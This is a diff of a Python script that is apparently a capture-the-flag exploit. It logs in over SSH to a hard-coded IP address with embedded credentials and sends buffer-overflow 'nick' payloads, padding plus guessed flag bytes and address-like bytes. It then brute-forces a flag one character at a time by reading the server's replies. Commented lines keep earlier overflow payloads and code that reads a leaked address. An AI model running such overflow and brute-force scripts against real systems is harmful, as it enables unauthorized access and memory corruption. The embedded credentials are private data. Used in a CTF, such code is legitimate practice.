@@ -77,19 +77,40 @@ def server_logic(guess):
     pass
 
 
+
 if __name__ == '__main__':
-    for i in range(255):
-        print("Iteration: {}".format(i))
+    index = 31
+    flag = "XXXXXXXXXXXX_XXXXXXX\x00\x00\x00\x00XXXXXXXX"
+
+    _i = 0
+    characters = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+\{\}[]></;'"
+    # characters = "_"
+    # characters = "rstuvwxyz0123456789!@#$%^&*()_+\{\}[]></;'"
+    # characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    test = characters[_i]
+    print("test now is: {}".format(test))
+
+    i = 0
+    while True:
+        i += 1
+        # print("Iteration: {}".format(i))
         with SshClient("35.157.31.6", 22, "challenger", "arkcon") as ssh_client:
             shell = ssh_client.ssh_connection.invoke_shell()
 
             data = shell.recv(1024)
-            print(data)
+            # print(data)
 
-            # nick = "A"*120 + "\n"
-            # nick = "A" * 120 + "\x40\x2d" + "\r"
-            # nick = "A" * 120 + "\x1e\x12" + "\r"
-            nick = "A" * 120 + "\x81\x2c" + "\r"
+
+            # "\x41\x2f"
+            test_flag = flag[:index] + test + flag[index+1:]
+            print(test_flag)
+            # test_flag = test*16
+            # nick = "A"*144 + "\n"
+            nick = "A" * 64 + test_flag + "\x00"*24 + "\x17" + "\r"
+            # nick = "A" * 112 + "\r"
+            # nick = "A" * 120 + "\x81\x2c" + "\r"
+            # nick = "A" * 120 + "\x41\x2f" + "\r"
+            
             # nick = "A"*112 + "\n"
             
             data = nick
@@ -98,23 +119,50 @@ if __name__ == '__main__':
             shell.sendall(data)
 
             data = shell.recv(1024)
-            print(data)
+            # print(data)
 
-            # i = 8 + len(nick)-1 + 4 + len(nick)-1
-            # print(data[i: i + 8])
-            # print(data[i: i + 8].encode('hex'))
+            # i_1 = 8 + len(nick)-1 + 4 + len(nick)-1
+            # addr = data[i_1: i_1 + 6]
+            # if addr[-1] == ' ': addr = addr[:-1] + "\x00"
+            # addr = addr + "\x00\x00"
+            # addr = "\x24\x2b" + addr[2:]
+            # print(len(addr))
 
-            data = "2\r\n"
+            # # print(data[i: i + 6])
+            # print(addr.encode('hex'))
+
+            data = "2\r"
             shell.sendall(data)
             
             data = shell.recv(1024)
             print(data)
 
-            import time
-            time.sleep(1)
 
-            data = shell.recv(1024)
-            print(data)
+            # guess = test_flag + "A"*(136 - 32) + "\x24\x2b" + '\r'
+            # data = guess
+            # shell.sendall(data)
+
+            # data = shell.recv(1024)
+            # print(data)
+
+            # import time
+            # time.sleep(1)
+
+            # data = shell.recv(1024)
+            # print(data)
+
+
+            # print(data)
+            
+            if "Wrong! Try again ;)" in data:
+                _i += 1
+                test = characters[_i]
+                print("test now is: {}".format(test))
+            elif "Flag found" in data:
+                print("Found: {}!".format(test))
+                break
+
+
 
         # ssh_client.ssh_connection.
 
